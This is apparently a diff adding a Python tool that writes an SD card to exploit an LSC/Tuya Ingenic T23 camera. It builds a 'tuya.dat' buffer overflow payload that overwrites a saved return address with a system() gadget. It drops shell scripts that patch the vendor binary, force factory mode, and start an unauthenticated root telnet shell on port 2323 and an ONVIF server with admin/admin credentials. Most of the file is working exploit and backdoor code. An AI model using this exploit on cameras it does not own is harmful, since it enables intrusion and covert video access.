@@ -1,0 +1,437 @@
+#!/usr/bin/env python3
+import argparse
+import shutil
+import stat
+import struct
+from pathlib import Path
+
+
+SYSTEM_SP20_GADGET = 0x0043A258
+COMMAND_OFFSET_FROM_FIELD = 0x68
+SAVED_RA_OFFSET_FROM_FIELD = 0x44
+BOOTSTRAP_COMMAND = b"sh /tmp/mnt/sdcard/factory/firstboot.sh"
+
+
+FIRSTBOOT = """#!/bin/sh
+SD=/tmp/mnt/sdcard
+LOGDIR="$SD/logs"
+LOG="$LOGDIR/firstboot.log"
+PATCHER="$SD/custom/bin/patch_stone_main"
+DST="$SD/factory/stone-main.bin"
+TMP="$DST.tmp"
+
+mkdir -p "$LOGDIR" "$SD/factory" >/dev/null 2>&1 || true
+: > "$LOG" 2>/dev/null || LOG=/dev/null
+
+log() {
+    echo "[$(date +%Y-%m-%dT%H:%M:%S)] $*" >> "$LOG"
+}
+
+fail() {
+    log "FAILED: $*"
+    echo firstboot-failed > /dev/console
+    exit 1
+}
+
+find_stone_exe() {
+    for exe in /proc/[0-9]*/exe; do
+        [ -r "$exe" ] || continue
+        "$PATCHER" --check "$exe" >/dev/null 2>&1 && {
+            echo "$exe"
+            return 0
+        }
+    done
+    return 1
+}
+
+echo firstboot-start > /dev/console
+log "start"
+
+[ -x "$PATCHER" ] || fail "missing patcher: $PATCHER"
+
+if [ -x "$DST" ] && "$PATCHER" --check "$DST" >> "$LOG" 2>&1; then
+    log "existing $DST is usable"
+else
+    src="$(find_stone_exe)" || fail "could not find running Tuya executable via /proc"
+    log "copying Tuya executable from $src"
+    rm -f "$TMP"
+    cp "$src" "$TMP" 2>> "$LOG" || fail "copy failed from $src"
+    "$PATCHER" "$TMP" >> "$LOG" 2>&1 || fail "patch failed"
+    chmod 755 "$TMP" 2>> "$LOG" || true
+    mv -f "$TMP" "$DST" 2>> "$LOG" || fail "move failed"
+    sync
+    log "wrote patched $DST"
+fi
+
+touch /config/fmode 2>> "$LOG" || fail "could not set /config/fmode"
+sync
+log "set /config/fmode; rebooting into factory bootstrap"
+echo firstboot-reboot > /dev/console
+reboot
+"""
+
+
+T23_ENTRYPOINT = """#!/bin/sh
+SD=/tmp/mnt/sdcard
+LOGDIR="$SD/logs"
+LOG="$LOGDIR/t23-entrypoint.log"
+
+mkdir -p "$LOGDIR" >/dev/null 2>&1 || true
+: > "$LOG" 2>/dev/null || LOG=/dev/null
+
+log() {
+    echo "[$(date +%Y-%m-%dT%H:%M:%S)] $*" >> "$LOG"
+}
+
+STONE_MAIN=/tmp/mnt/sdcard/factory/stone-main.bin
+TELNET_PORT=2323
+ONVIF_PORT=8899
+TUYA_HUM_ON_OFF=0
+TUYA_PIR_ON_OFF=0
+TUYA_FLIP_ONOFF=0
+TUYA_WATERMARK_ONOFF=0
+AIC_FILTER_SECONDS=90
+
+echo t23-entrypoint-start > /dev/console
+log "start"
+for run_log in stone-main.log telnetd.log aic_filter.log stream_relay.log onvif_httpd.log wsd_simple_server.log onvif_simple_server.log; do
+    : > "$LOGDIR/$run_log" 2>/dev/null || true
+done
+log "reset per-run logs"
+
+if [ -f "$SD/tuya.dat" ]; then
+    mv -f "$SD/tuya.dat" "$SD/tuya.dat.used" 2>> "$LOG" || rm -f "$SD/tuya.dat" 2>> "$LOG" || true
+    log "consumed tuya.dat trigger"
+else
+    log "tuya.dat trigger already consumed"
+fi
+
+touch /config/fmode 2>> "$LOG" || true
+sync
+log "asserted /config/fmode"
+
+start_telnetd() {
+    mkdir -p /dev/pts 2>> "$LOGDIR/telnetd.log" || true
+    mount | grep 'on /dev/pts ' >/dev/null 2>&1 || mount -t devpts devpts /dev/pts 2>> "$LOGDIR/telnetd.log" || true
+    log "starting telnetd port=$TELNET_PORT"
+    echo "telnetd-start-$TELNET_PORT" > /dev/console
+    /sbin/telnetd -p "$TELNET_PORT" -l /bin/sh >> "$LOGDIR/telnetd.log" 2>&1 &
+    log "started telnetd pid=$!"
+}
+
+start_aic_forward() {
+    (
+        helper="$SD/custom/bin/aic_filter"
+        if [ ! -x "$helper" ]; then
+            log "missing AIC filter helper: $helper"
+            exit 0
+        fi
+
+        i=0
+        while [ "$i" -lt "$AIC_FILTER_SECONDS" ]; do
+            {
+                echo "===== aic-filter round $i $(date +%Y-%m-%dT%H:%M:%S) ====="
+                "$helper"
+            } >> "$LOGDIR/aic_filter.log" 2>&1 || true
+            i=$((i + 1))
+            sleep 1
+        done
+        log "finished AIC TCP forward setup"
+    ) &
+    log "started AIC TCP forward pid=$!"
+}
+
+start_stream_relay() {
+    helper="$SD/custom/bin/stone_dump_relay"
+    if [ ! -x "$helper" ]; then
+        log "missing stream relay helper: $helper"
+        return
+    fi
+
+    log "starting stream relay"
+    echo stream-relay-start > /dev/console
+    "$helper" >> "$LOGDIR/stream_relay.log" 2>&1 &
+    log "started stream relay pid=$!"
+}
+
+start_onvif() {
+    httpd="$SD/custom/bin/onvif_cgi_httpd"
+    wsd="$SD/custom/bin/wsd_simple_server"
+    onvif_root="$SD/custom/onvif"
+
+    if [ ! -x "$httpd" ]; then
+        log "missing ONVIF HTTP helper: $httpd"
+        return
+    fi
+    if [ ! -x "$SD/custom/bin/onvif_simple_server" ]; then
+        log "missing ONVIF CGI helper: $SD/custom/bin/onvif_simple_server"
+        return
+    fi
+    if [ ! -f "$onvif_root/onvif_simple_server.conf" ]; then
+        log "missing ONVIF config: $onvif_root/onvif_simple_server.conf"
+        return
+    fi
+
+    log "starting ONVIF HTTP port=$ONVIF_PORT"
+    echo onvif-http-start > /dev/console
+    "$httpd" >> "$LOGDIR/onvif_httpd.log" 2>&1 &
+    log "started ONVIF HTTP pid=$!"
+
+    if [ -x "$wsd" ] && [ -d "$onvif_root/wsd_files" ]; then
+        log "starting ONVIF WS-Discovery"
+        "$wsd" -i wlan0 -x "http://%s:$ONVIF_PORT/onvif/device_service" \
+            -m "LSC%20Outdoor%20Camera" -n "LSC" \
+            -p /tmp/wsd_simple_server.pid -t "$onvif_root/wsd_files" -f \
+            >> "$LOGDIR/wsd_simple_server.log" 2>&1 &
+        log "started ONVIF WS-Discovery pid=$!"
+    else
+        log "missing ONVIF WS-Discovery helper or templates"
+    fi
+}
+
+set_tuya_config() {
+    key="$1"
+    value="$2"
+    path="/config/tuya/$key"
+    current="$(cat "$path" 2>/dev/null || true)"
+    if [ "$current" = "$value" ]; then
+        return
+    fi
+    printf "%s\\n" "$value" > "$path" 2>> "$LOG" && log "set $key=$value"
+}
+
+configure_tuya_motion() {
+    mkdir -p /config/tuya 2>> "$LOG" || true
+    set_tuya_config tuya_hum_on_off "$TUYA_HUM_ON_OFF"
+    set_tuya_config tuya_pir_on_off "$TUYA_PIR_ON_OFF"
+    set_tuya_config tuya_flip_onoff "$TUYA_FLIP_ONOFF"
+    set_tuya_config tuya_watermark_onoff "$TUYA_WATERMARK_ONOFF"
+    sync
+}
+
+start_stone_main() {
+    if [ -x "$STONE_MAIN" ]; then
+        "$STONE_MAIN" >> "$LOGDIR/stone-main.log" 2>&1 &
+        log "started Tuya stone main pid=$!"
+    else
+        log "missing executable STONE_MAIN=$STONE_MAIN"
+        echo missing-stone-main > /dev/console
+    fi
+}
+
+configure_tuya_motion
+start_telnetd
+start_stream_relay
+start_onvif
+start_aic_forward
+start_stone_main
+
+wait
+"""
+
+
+FACTORY_MAIN = """#!/bin/sh
+SD=/tmp/mnt/sdcard
+LOG="$SD/factory/main.log"
+ENTRYPOINT="$SD/custom/scripts/entrypoint_t23.sh"
+
+mkdir -p "$SD/factory" "$SD/logs" "$SD/custom/scripts" >/dev/null 2>&1 || true
+: > "$LOG" 2>/dev/null || LOG=/dev/null
+echo factory-main-bootstrap > /dev/console
+echo factory-main-bootstrap >> "$LOG"
+
+if [ -f "$ENTRYPOINT" ]; then
+    chmod +x "$ENTRYPOINT" 2>/dev/null || true
+    exec /bin/sh "$ENTRYPOINT"
+fi
+
+echo "missing $ENTRYPOINT" >> "$LOG"
+echo missing-entrypoint-t23 > /dev/console
+while true; do
+    sleep 3600
+done
+"""
+
+
+ONVIF_CONFIG = """model=LSC Outdoor Camera
+manufacturer=LSC
+firmware_ver=6.2712.35
+hardware_id=Ingenic T23
+serial_num=LSC-T23
+ifs=wlan0
+port=8899
+scope=onvif://www.onvif.org/Profile/Streaming
+scope=onvif://www.onvif.org/Profile/T
+scope=onvif://www.onvif.org/hardware/LSC-T23
+scope=onvif://www.onvif.org/name/LSC%20Outdoor%20Camera
+user=admin
+password=admin
+adv_enable_media2=0
+adv_fault_if_unknown=0
+adv_fault_if_set=0
+adv_synology_nvr=0
+name=Profile_0
+width=1920
+height=1080
+url=rtsp://%s:8554/main_ch
+snapurl=
+type=H264
+audio_encoder=NONE
+audio_decoder=NONE
+ptz=0
+events=0
+"""
+
+
+def build_tuya_dat(command: bytes) -> bytes:
+    if b"," in command:
+        raise ValueError("command must not contain comma bytes")
+    field = bytearray(b"A" * COMMAND_OFFSET_FROM_FIELD)
+    struct.pack_into("<I", field, SAVED_RA_OFFSET_FROM_FIELD, SYSTEM_SP20_GADGET)
+    field.extend(command + b"\0")
+    return bytes(field) + b",B,C,D,\n"
+
+
+def chmod_exec(path: Path) -> None:
+    path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
+
+
+def copy_aic_filter(mount: Path) -> None:
+    src = Path(__file__).resolve().parents[1] / "build" / "mipsel" / "bin" / "aic_filter"
+    if not src.is_file():
+        raise SystemExit(f"missing {src}; run ./tools/compile.sh first")
+
+    dst = mount / "custom" / "bin" / "aic_filter"
+    dst.parent.mkdir(parents=True, exist_ok=True)
+    shutil.copy2(src, dst)
+    chmod_exec(dst)
+
+
+def copy_stream_relay(mount: Path) -> None:
+    src = Path(__file__).resolve().parents[1] / "build" / "mipsel" / "bin" / "stone_dump_relay"
+    if not src.is_file():
+        raise SystemExit(f"missing {src}; run ./tools/compile.sh first")
+
+    dst = mount / "custom" / "bin" / "stone_dump_relay"
+    dst.parent.mkdir(parents=True, exist_ok=True)
+    shutil.copy2(src, dst)
+    chmod_exec(dst)
+
+
+def copy_patch_helper(mount: Path) -> None:
+    src = Path(__file__).resolve().parents[1] / "build" / "mipsel" / "bin" / "patch_stone_main"
+    if not src.is_file():
+        raise SystemExit(f"missing {src}; run ./tools/compile.sh first")
+
+    dst = mount / "custom" / "bin" / "patch_stone_main"
+    dst.parent.mkdir(parents=True, exist_ok=True)
+    shutil.copy2(src, dst)
+    chmod_exec(dst)
+
+
+def copy_onvif_files(mount: Path) -> None:
+    root = Path(__file__).resolve().parents[1]
+    bin_dir = root / "build" / "mipsel" / "bin"
+    onvif_src = root / "build" / "third_party" / "onvif_simple_server"
+    bin_names = ("onvif_cgi_httpd", "onvif_simple_server", "wsd_simple_server")
+    asset_dirs = (
+        "device_service_files",
+        "deviceio_service_files",
+        "events_service_files",
+        "generic_files",
+        "media2_service_files",
+        "media_service_files",
+        "notify_files",
+        "ptz_service_files",
+        "wsd_files",
+    )
+
+    for name in bin_names:
+        src = bin_dir / name
+        if not src.is_file():
+            raise SystemExit(f"missing {src}; run ./tools/compile.sh first")
+        dst = mount / "custom" / "bin" / name
+        dst.parent.mkdir(parents=True, exist_ok=True)
+        shutil.copy2(src, dst)
+        chmod_exec(dst)
+
+    if not onvif_src.is_dir():
+        raise SystemExit(f"missing {onvif_src}; run ./tools/compile.sh first")
+
+    dst_root = mount / "custom" / "onvif"
+    dst_root.mkdir(parents=True, exist_ok=True)
+    (dst_root / "onvif_simple_server.conf").write_text(ONVIF_CONFIG, encoding="ascii")
+
+    for name in asset_dirs:
+        src = onvif_src / name
+        if not src.is_dir():
+            raise SystemExit(f"missing ONVIF asset directory {src}")
+        shutil.copytree(src, dst_root / name, dirs_exist_ok=True)
+
+    for xml in (dst_root / "device_service_files").glob("*.xml"):
+        data = xml.read_text(encoding="ascii")
+        data = data.replace('UsernameToken="false"', 'UsernameToken="true"')
+        data = data.replace("MaxUsers=\"0\"", "MaxUsers=\"1\"")
+        data = data.replace("MaxUserNameLength=\"0\"", "MaxUserNameLength=\"32\"")
+        data = data.replace("MaxPasswordLength=\"0\"", "MaxPasswordLength=\"64\"")
+        xml.write_text(data, encoding="ascii")
+
+
+def write_mount(mount: Path, payload: bytes) -> None:
+    if not mount.is_dir():
+        raise SystemExit(f"mountpoint is not a directory: {mount}")
+
+    (mount / "factory").mkdir(parents=True, exist_ok=True)
+    (mount / "custom" / "scripts").mkdir(parents=True, exist_ok=True)
+    (mount / "logs").mkdir(parents=True, exist_ok=True)
+
+    (mount / "tuya.dat").write_bytes(payload)
+
+    factory_main = mount / "factory" / "main"
+    factory_main.write_text(FACTORY_MAIN, encoding="ascii")
+    chmod_exec(factory_main)
+
+    firstboot = mount / "factory" / "firstboot.sh"
+    firstboot.write_text(FIRSTBOOT, encoding="ascii")
+    chmod_exec(firstboot)
+
+    entrypoint = mount / "custom" / "scripts" / "entrypoint_t23.sh"
+    entrypoint.write_text(T23_ENTRYPOINT, encoding="ascii")
+    chmod_exec(entrypoint)
+
+    copy_aic_filter(mount)
+    copy_stream_relay(mount)
+    copy_patch_helper(mount)
+    copy_onvif_files(mount)
+
+
+def main() -> int:
+    parser = argparse.ArgumentParser(
+        description="Write the minimal T23/AIC SD bootstrap files and tuya.dat overflow kicker."
+    )
+    parser.add_argument("mountpoint", nargs="?", help="SD card mountpoint to write")
+    args = parser.parse_args()
+
+    payload = build_tuya_dat(BOOTSTRAP_COMMAND)
+
+    if not args.mountpoint:
+        parser.error("provide a mountpoint")
+
+    mount = Path(args.mountpoint)
+    write_mount(mount, payload)
+
+    print(f"wrote {mount / 'tuya.dat'} ({len(payload)} bytes)")
+    print(f"wrote {mount / 'factory' / 'main'}")
+    print(f"wrote {mount / 'factory' / 'firstboot.sh'}")
+    print(f"wrote {mount / 'custom' / 'scripts' / 'entrypoint_t23.sh'}")
+    print("telnet: telnet <camera-ip> 2323")
+    print("RTSP main stream: rtsp://<camera-ip>:8554/main_ch")
+    print("ONVIF device service: http://<camera-ip>:8899/onvif/device_service")
+    print("raw H264 main stream: nc <camera-ip> 8555 > stream.h264")
+    print(f"system() command at overflow offset 0x{COMMAND_OFFSET_FROM_FIELD:x}: {BOOTSTRAP_COMMAND.decode('ascii')}")
+    print(f"saved RA overwrite at offset 0x{SAVED_RA_OFFSET_FROM_FIELD:x}: 0x{SYSTEM_SP20_GADGET:08x}")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
